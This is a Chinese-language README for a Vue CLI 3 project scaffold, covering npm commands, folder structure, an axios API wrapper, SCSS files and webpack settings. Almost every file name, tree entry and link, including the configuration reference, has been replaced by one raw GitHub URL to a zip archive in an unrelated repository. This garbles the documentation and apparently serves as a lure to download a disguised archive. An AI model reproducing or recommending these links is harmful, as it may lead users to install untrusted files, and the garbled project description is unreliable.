# vue-cli3 wong's 腳手架

> 一套架構，開發即上手

文件編譯時間: 2019/05/31

## Project start

```
npm install
```

### Compiles and hot-reloads for development

```
npm run serve
```

### Compiles and minifies for User acceptance testing

```
npm run build-uat
```

### Compiles and minifies for production

```
npm run build-prod
```

### Lints and fixes files

```
npm run lint
```

# 專案結構

```
vue-cli
├── public
├── src
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── .gitignore
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
└── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
```

## src 介紹

```
src
├── assets
├── components
├── service
│ ├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
│ └── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── styles
│ ├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
│ ├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
│ └── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── views
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
├── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
└── https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip
```

### components

> 提供給`https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip`所建立的各組件存放處

### service

> 透過 https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip 檔來呼叫 API 來做到集中管理的目的，後端有開 API 就在此資料夾內新增 https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip 檔來管理，同一種類型的 API 就可以合併到同一支好方便管理

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    運用 axios 進行二次封裝，透過此 js 檔去整合所有呼叫 API 的方式和訊息集中管理

    -   http

        整合呼叫 API 的 共同參數

    -   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

        整合所有 API 呼叫時的錯誤訊息

    -   getRequest

        使用 get 的方式呼叫 API

    -   postRequest

        使用 post 的方式呼叫 API

    -   patchRequest

        使用 patch 的方式呼叫 API(更新資料)

    -   AjaxFunction

        最終呼叫 API 的方法

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    藉由引入 https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip 指定呼叫 API 的方式，來建立該 API 系列 的呼叫方法，因而達到相關 API 的集中管理和維護

### styles

> 集中管理 scss 檔的資料夾

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    匯集各 scss 檔，且一併輸出給各 `.vue` 檔

-   \https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    定義各種變數的 scss 檔

-   \https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    定義 RWD 的 scss 檔

### views

> 組合`https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip`，並搭配`https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip`輸出成頁面

### https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

> 設定環境變數

## https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip 介紹

> 覆蓋 vue 的 webpack 預設設定

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    統一輸出 https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip 檔

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    針對 local 端跨網域問題，以`/api`當作域名來源

-   https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip

    針對 eslint 錯誤顯示設定

### Customize configuration

See [Configuration Reference](https://github.com/smallwong/lennys-podcast-transcripts/raw/refs/heads/master/src/assets/podcast-transcripts-lennys-minimalism.zip).
